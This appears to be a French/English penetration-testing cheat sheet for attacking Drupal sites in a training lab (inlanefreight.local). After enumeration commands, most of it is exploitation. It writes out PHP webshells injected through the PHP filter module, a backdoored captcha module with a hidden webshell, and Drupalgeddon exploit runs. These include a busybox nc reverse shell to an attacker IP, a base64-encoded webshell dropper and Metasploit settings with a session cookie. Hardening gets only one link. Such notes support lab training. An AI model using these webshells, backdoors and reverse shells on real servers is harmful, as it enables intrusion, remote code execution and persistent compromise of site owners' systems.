
[[#ENUMERATION MANUELLE]]
[[#ENUMERATION DROOPESCAN]]
[[#EXPLOITATION]]
[[#HARDENING]]

Drupal supports three types of users by default:

1. `Administrator`: This user has complete control over the Drupal website.
2. `Authenticated User`: These users can log in to the website and perform operations such as adding and editing articles based on their permissions.
3. `Anonymous`: All website visitors are designated as anonymous. By default, these users are only allowed to read posts.



# ENUMERATION MANUELLE

- [[#Identifier Drupal]]
- [[#Version Drupal]]


/robots.txt
/sitemap.xml

## Identifier Drupal

```shell
curl -s http://drupal.inlanefreight.local | grep Drupal
```

contenu indexé au travers de nodes.

```
/node/<nodeid>
```


## Version Drupal

```shell
curl -s http://drupal-acc.inlanefreight.local/CHANGELOG.txt | grep -m2 ""
```


# ENUMERATION #DROOPESCAN


```shell
sudo droopescan scan drupal -u http://drupal.inlanefreight.local -e a
```


# ENUMERATION #CMSMAP

```bash
python3 cmsmap.py -f D -F -d <URL>
```

# ENUMERATION #VULNX 


```bash
vulnx -u <url> --cms-info all --web-info --domain-info
```



---

# EXPLOITATION


- [[#Tester Weak credentials / Credential stuffing]]
- [[#PHP Filter Module (before version 8)]]
- [[#PHP Filter Module (after version 8)]]
- [[#Uploading a Backdoored Module]]
- [[#CVEs]]


## Tester Weak credentials / Credential stuffing

admin:admin, admin:password....
### Credential Stuffing (Liste de default creds)

Resources:

https://www.cirt.net/passwords
https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials
https://github.com/scadastrangelove/SCADAPASS/blob/master/scadapass.csv
https://github.com/ihebski/DefaultCreds-cheat-sheet/tree/main




## PHP Filter Module (before version 8)

> [!TIP]
> Possible d'activer le Php Filter Module afin d'injecter du code php.
> Si le module est installé mais le PHP Code n'est pas disponible, aller dans les permissions du module et cocher Use the PHP code text format 


Content --> Add content -> Basic Page

```php
<?php
system($_GET['cmd']);
?>
```

Text format -> PHP code

### RCE

```shell
curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id | grep uid | cut -f4 -d">"
```

## PHP Filter Module (after version 8)

`Administration` > `Reports` > `Available updates`.

Install from a URL https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz


ou bien 

```shell
wget https://ftp.drupal.org/files/projects/php-8.x-1.1.tar.gz
```

Puis Browse -> php-8.x-1.1.tar.gz -> Install


Content --> Add content -> Basic Page

```php
<?php
system($_GET['cmd']);
?>
```

Text format -> PHP code

### RCE

```shell
curl -s http://drupal-qa.inlanefreight.local/node/3?cmd=id | grep uid | cut -f4 -d">"
```


## Uploading a Backdoored Module

> [!TIP]
> Ajouter un shell à un module existant

#### Module Captcha

https://www.drupal.org/project/captcha

1. Télécharger la version tar.gz du module

```shell
wget --no-check-certificate https://ftp.drupal.org/files/projects/captcha-8.x-1.2.tar.gz
```

```shell
tar xvf captcha-8.x-1.2.tar.gz
```

2. Créer un webshell bb58021f870b5f85c6c24120540de43f.php

```php
<?php
system($_GET[bb58021f870b5f85c6c24120540de43f]);
?>
```

3. Créer un fichier .htaccess

```html
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /
</IfModule>
```

4. Ajouter les 2 fichiers à une archive

```shell
mv bb58021f870b5f85c6c24120540de43f.php .htaccess captcha
```

```shell
tar cvf captcha.tar.gz captcha/
```

5. Depuis l'administration de drupal -> Manage -> Extend -> + Install new module
6. Browse et récupérer l'archive créée
7. Install
8. RCE

```shell-session
curl -s drupal.inlanefreight.local/modules/captcha/bb58021f870b5f85c6c24120540de43f.php?bb58021f870b5f85c6c24120540de43f=id
```

## CVEs

Rechercher CVEs

- [[#Drupalgeddon ([CVE-2014-3704](https //www.drupal.org/SA-CORE-2014-005)) (7.0 à 7.31)|Drupalgeddon]]
- [[#Drupalgeddon2 ([CVE-2018-7600](https //www.drupal.org/sa-core-2018-002)) (7.58 à 8.5.1)|Drupalgeddon2]]
- [[#Drupalgeddon3 ([CVE-2018-7602](https //cvedetails.com/cve/CVE-2018-7602/)) (7.x / 8.x)|Drupalgeddon3]]

### Drupalgeddon ([CVE-2014-3704](https://www.drupal.org/SA-CORE-2014-005)) (7.0 à 7.31)

Injection SQL

https://www.exploit-db.com/exploits/34992

ajout d'un user admin

```shell
python2.7 drupalgeddon.py -t http://drupal-qa.inlanefreight.local -u hacker -p pwnd
```

#### Metasploit

https://www.rapid7.com/db/modules/exploit/multi/http/drupal_drupageddon/

```
use exploit/multi/http/drupal_drupageddon
```




### Drupalgeddon2 ([CVE-2018-7600](https://www.drupal.org/sa-core-2018-002)) (7.58 à 8.5.1)

RCE

https://www.exploit-db.com/exploits/44448

#### Reverse Shell

Modifier le poc et changer la command echo dans l'exploit

```shell
busybox nc 10.10.14.63 443 -e /bin/bash
```

Lancer le poc

```shell
python3 drupalgeddon2.py
```

#### Webshell

Générer webshell en base64

```shell
echo '<?php system($_GET[bb58021f870b5f85c6c24120540de43f]);?>' | base64
```

Modifier le poc et changer la command echo dans l'exploit

```shell
echo "PD9waHAgc3lzdGVtKCRfR0VUW2JiNTgwMjFmODcwYjVmODVjNmMyNDEyMDU0MGRlNDNmXSk7Pz4K" | base64 -d | tee bb58021f870b5f85c6c24120540de43f.php
```

Lancer le poc

```shell
python3 drupalgeddon2.py
```

RCE

```shell
curl http://drupal-dev.inlanefreight.local/haha.php?bb58021f870b5f85c6c24120540de43f=id
```


### Drupalgeddon3 ([CVE-2018-7602](https://cvedetails.com/cve/CVE-2018-7602/)) (7.x / 8.x)

> [!TIP]
> Necessite la permission de delete un node

Authenticated RCE


#### Metasploit Reverse shell

1. Récupérer cookie de session
2. Dans msfconsole

```shell
use multi/http/drupal_drupageddon3
```

```shell-session
set rhosts 10.129.42.195
```

```shell-session
set VHOST drupal-acc.inlanefreight.local
```

```shell-session
set drupal_session SESS45ecfcb93a827c3e578eae161f280548=jaAPbanr2KhLkLJwo69t0UOkn2505tXCaEdu33ULV2Y
```

```shell-session
set DRUPAL_NODE 1
```

```shell-session
set LHOST 10.10.14.15
```

```shell-session
show options 
```

```shell-session
exploit
```



---
# HARDENING

https://www.drupal.org/docs/administering-a-drupal-site/security-in-drupal